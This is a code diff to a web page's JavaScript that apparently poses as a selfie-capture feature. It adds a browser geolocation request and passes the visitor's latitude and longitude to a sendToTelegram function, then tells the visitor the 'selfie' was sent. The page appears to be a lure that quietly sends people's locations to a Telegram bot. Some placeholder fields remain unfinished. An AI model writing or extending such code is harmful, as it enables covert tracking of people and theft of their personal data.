@@ -62,18 +62,34 @@
             document.body.appendChild(statusDiv);
 
             try {
-                // Simulate data capture (since camera is removed)
-                const data = {
-                    image: 'default_image_url', // Replace with a default image URL
-                    lat: 0, // Replace with actual latitude
-                    lon: 0, // Replace with actual longitude
-                    source: 'simulated', // Replace with actual source
-                    device: 'simulated_device' // Replace with actual device info
-                };
+                // Request geolocation permission
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        async (position) => {
+                            const lat = position.coords.latitude;
+                            const lon = position.coords.longitude;
 
-                // Send everything
-                await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
-                statusDiv.textContent = '✅ Selfie captured and sent!';
+                            // Simulate data capture (since camera is removed)
+                            const data = {
+                                image: 'default_image_url', // Replace with a default image URL
+                                lat: lat,
+                                lon: lon,
+                                source: 'simulated', // Replace with actual source
+                                device: 'simulated_device' // Replace with actual device info
+                            };
+
+                            // Send everything
+                            await sendToTelegram(data.image, data.lat, data.lon, data.source, data.device, 'User');
+                            statusDiv.textContent = '✅ Selfie captured and sent!';
+                        },
+                        (error) => {
+                            console.error('Error getting location:', error);
+                            statusDiv.textContent = '❌ Failed to get location.';
+                        }
+                    );
+                } else {
+                    statusDiv.textContent = '❌ Geolocation is not supported by this browser.';
+                }
             } catch (err) {
                 console.error(err);
                 statusDiv.textContent = '❌ Failed to capture and send selfie.';
